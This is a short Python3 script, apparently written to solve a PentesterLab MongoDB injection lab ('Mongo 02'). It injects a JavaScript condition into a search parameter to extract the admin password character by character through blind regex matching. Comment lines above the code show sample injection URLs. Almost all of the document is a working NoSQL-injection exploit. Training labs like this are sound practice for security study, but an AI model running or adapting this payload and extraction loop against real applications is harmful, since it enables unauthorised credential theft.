##Quick and dirty script in Python3 written to solve the PentesterLab Mongo 02 Challenge##

# http://ptc-b5d4fa12-8ed46fb7.libcurl.so/?search=admin%27%26%26%20this.password.match(/d/)%00 = true
# http://ptc-b5d4fa12-8ed46fb7.libcurl.so/?search=admin%27%26%26%20this.password.match(/aaa/)%00 = false

# http://ptc-b5d4fa12-8ed46fb7.libcurl.so/?search=admin%27%26%26%20this.password.match(/^5/)%00 = password starts with a '5'

import urllib.request
import string

URL="http://ptc-b5d4fa12-8ed46fb7.libcurl.so"

def check(payload):
    url=URL+"/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
    print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)

#print(check("^5*"))
#print(check("^52.*$"))

CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)


